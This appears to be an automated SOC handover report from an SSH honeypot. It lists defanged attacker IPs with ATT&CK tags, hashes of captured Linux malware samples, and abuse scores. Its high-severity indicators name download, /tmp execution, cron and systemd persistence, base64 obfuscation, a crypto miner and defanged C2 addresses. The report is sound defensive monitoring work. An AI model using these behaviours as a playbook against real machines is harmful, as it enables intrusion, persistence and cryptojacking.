| `173.76.195[.]120` | 1 | 2026-11-16 13:57 | 2026-11-16 13:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-11-16 08:07 | 2026-11-16 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-16 07:49 | 2026-11-16 07:49 | 9s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-16 17:21 | 2026-11-16 17:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.245[.]203` | 1 | 2026-11-16 15:35 | 2026-11-16 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.245[.]203` | 1 | 2026-11-16 18:54 | 2026-11-16 18:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.174.142[.]253` | 1 | 2026-11-16 10:04 | 2026-11-16 10:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]195` | 1 | 2026-11-16 06:52 | 2026-11-16 06:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.112.148[.]66` | 1 | 2026-11-16 18:31 | 2026-11-16 18:32 | 38s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-11-16 16:51 | 2026-11-16 16:51 | 19s | 0 | `T1592` | 🟢 LOW |
| `185.95.156[.]176` | 1 | 2026-11-16 14:31 | 2026-11-16 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.32.178[.]98` | 1 | 2026-11-16 09:57 | 2026-11-16 09:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `189.56.0[.]19` | 1 | 2026-11-16 15:23 | 2026-11-16 15:23 | 7s | 0 | `T1592` | 🟢 LOW |
| `190.55.31[.]75` | 1 | 2026-11-16 19:13 | 2026-11-16 19:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.242.184[.]240` | 1 | 2026-11-16 15:31 | 2026-11-16 15:32 | 60s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-16 13:50 | 2026-11-16 13:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-16 16:38 | 2026-11-16 16:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-16 19:09 | 2026-11-16 19:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-11-16 15:35 | 2026-11-16 15:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]26` | 1 | 2026-11-16 09:38 | 2026-11-16 09:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-16 12:16 | 2026-11-16 12:16 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-16 14:22 | 2026-11-16 14:22 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-16 18:22 | 2026-11-16 18:22 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-16 20:32 | 2026-11-16 20:32 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.211.213[.]198` | 1 | 2026-11-16 12:09 | 2026-11-16 12:10 | 12s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]150` | 1 | 2026-11-16 14:55 | 2026-11-16 14:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `197.219.208[.]38` | 1 | 2026-11-16 13:42 | 2026-11-16 13:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `197.219.208[.]58` | 1 | 2026-11-16 09:53 | 2026-11-16 09:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `197.219.228[.]246` | 1 | 2026-11-16 17:26 | 2026-11-16 17:26 | 8s | 0 | `T1592` | 🟢 LOW |
| `197.219.228[.]250` | 1 | 2026-11-16 19:54 | 2026-11-16 19:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]49` | 1 | 2026-11-16 11:48 | 2026-11-16 11:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.180.15[.]240` | 1 | 2026-11-16 07:55 | 2026-11-16 07:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `20.150.212[.]63` | 1 | 2026-11-16 13:54 | 2026-11-16 13:54 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.163.168[.]220` | 1 | 2026-11-16 07:19 | 2026-11-16 07:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.163.58[.]65` | 1 | 2026-11-16 16:08 | 2026-11-16 16:08 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.29.52[.]64` | 1 | 2026-11-16 17:38 | 2026-11-16 17:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.227.11[.]6` | 1 | 2026-11-16 09:12 | 2026-11-16 09:12 | 25s | 0 | `T1592` | 🟢 LOW |
| `211.23.219[.]107` | 1 | 2026-11-16 08:32 | 2026-11-16 08:33 | 26s | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]73` | 1 | 2026-11-16 13:52 | 2026-11-16 13:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.127.191[.]27` | 1 | 2026-11-16 07:16 | 2026-11-16 07:16 | 16s | 0 | `T1592` | 🟢 LOW |
| `221.158.100[.]113` | 1 | 2026-11-16 14:29 | 2026-11-16 14:30 | 28s | 0 | `T1592` | 🟢 LOW |
| `221.195.114[.]14` | 1 | 2026-11-16 08:42 | 2026-11-16 08:43 | 58s | 0 | `T1592` | 🟢 LOW |
| `222.109.132[.]225` | 1 | 2026-11-16 07:31 | 2026-11-16 07:31 | 23s | 0 | `T1592` | 🟢 LOW |
| `24.144.111[.]22` | 1 | 2026-11-16 11:29 | 2026-11-16 11:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.148.20[.]213` | 1 | 2026-11-16 08:27 | 2026-11-16 08:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.148.244[.]168` | 1 | 2026-11-16 14:53 | 2026-11-16 14:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.173.20[.]80` | 1 | 2026-11-16 14:07 | 2026-11-16 14:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.184.195[.]248` | 1 | 2026-11-16 08:07 | 2026-11-16 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.202.177[.]173` | 1 | 2026-11-16 14:37 | 2026-11-16 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.193.177[.]165` | 1 | 2026-11-16 12:17 | 2026-11-16 12:18 | 92s | 0 | `T1592` | 🟢 LOW |
| `45.119.211[.]179` | 1 | 2026-11-16 13:14 | 2026-11-16 13:15 | 59s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-11-16 13:10 | 2026-11-16 13:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-16 10:09 | 2026-11-16 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]160` | 1 | 2026-11-16 17:32 | 2026-11-16 17:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]161` | 1 | 2026-11-16 17:32 | 2026-11-16 17:32 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-16 08:39 | 2026-11-16 08:39 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-16 07:40 | 2026-11-16 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-16 13:36 | 2026-11-16 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.223.245[.]120` | 1 | 2026-11-16 12:49 | 2026-11-16 12:49 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]247` | 1 | 2026-11-16 19:57 | 2026-11-16 19:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-16 12:39 | 2026-11-16 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]114` | 1 | 2026-11-16 06:59 | 2026-11-16 06:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]99` | 1 | 2026-11-16 13:31 | 2026-11-16 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-16 14:36 | 2026-11-16 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.219[.]146` | 1 | 2026-11-16 06:55 | 2026-11-16 06:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.154[.]144` | 1 | 2026-11-16 07:24 | 2026-11-16 07:24 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-11-16 09:20 | 2026-11-16 09:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-11-16 19:43 | 2026-11-16 19:43 | 10s | 0 | `T1592` | 🟢 LOW |
| `76.39.71[.]105` | 1 | 2026-11-16 20:26 | 2026-11-16 20:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-16 14:12 | 2026-11-16 14:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-16 17:42 | 2026-11-16 17:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]153` | 1 | 2026-11-16 06:54 | 2026-11-16 06:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-16 20:33 | 2026-11-16 20:33 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `77.67.26[.]49` | 1 | 2026-11-16 13:22 | 2026-11-16 13:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-16 09:47 | 2026-11-16 09:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-16 07:15 | 2026-11-16 07:15 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-16 11:39 | 2026-11-16 11:39 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-16 16:01 | 2026-11-16 16:02 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-16 20:29 | 2026-11-16 20:29 | 6s | 0 | `T1592` | 🟢 LOW |
| `8.209.82[.]97` | 1 | 2026-11-16 08:28 | 2026-11-16 08:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.218.211[.]50` | 1 | 2026-11-16 09:42 | 2026-11-16 09:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-11-16 09:58 | 2026-11-16 09:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]211` | 1 | 2026-11-16 08:07 | 2026-11-16 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.163.248[.]3` | 1 | 2026-11-16 14:52 | 2026-11-16 14:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `82.34.153[.]194` | 1 | 2026-11-16 10:01 | 2026-11-16 10:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `85.192.188[.]159` | 1 | 2026-11-16 11:43 | 2026-11-16 11:43 | 14s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]15` | 1 | 2026-11-16 09:31 | 2026-11-16 09:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-11-16 13:33 | 2026-11-16 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]14` | 1 | 2026-11-16 07:18 | 2026-11-16 07:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.211.135[.]251` | 1 | 2026-11-16 08:36 | 2026-11-16 08:36 | 11s | 0 | `T1592` | 🟢 LOW |
| `91.244.19[.]88` | 1 | 2026-11-16 08:26 | 2026-11-16 08:27 | 11s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]75` | 1 | 2026-11-16 13:21 | 2026-11-16 13:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.131.219[.]244` | 1 | 2026-11-16 08:29 | 2026-11-16 08:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.24.228[.]144` | 1 | 2026-11-16 20:31 | 2026-11-16 20:31 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `92.118.39[.]75` | RO | DMZHOST | **100** ⚠️ | 50 |
| `160.119.66[.]206` | NL | HostMem | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `195.178.110[.]78` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 8 |
| `77.239.124[.]252` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 26 |
| `45.156.129[.]161` | US | INAP-CHI-1 | **100** ⚠️ | 50 |
| `38.43.213[.]195` | VE | Full Data Comunicaciones Inc | **100** ⚠️ | 4 |
| `2.180.15[.]240` | IR | mashhad dsl | **100** ⚠️ | 14 |
| `121.168.83[.]124` | KR | Korea Telecom | **100** ⚠️ | 35 |
| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 490 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 490 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 192 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 36 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 35 |

---

## 🔕 False Positive Summary (50 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 14 |
| AbuseIPDB score 1 below threshold 25 | 9 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 6 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 674 cases |
| Tool 34  | Credential Extractor        | ✅ 2432 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 26 fingerprints |
| Tool 36  | Command Clustering          | ✅ 215 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 307 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 50 filtered (7.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 133 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 476 priority case(s) shown individually · 133 recon entry/entries in table (11 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
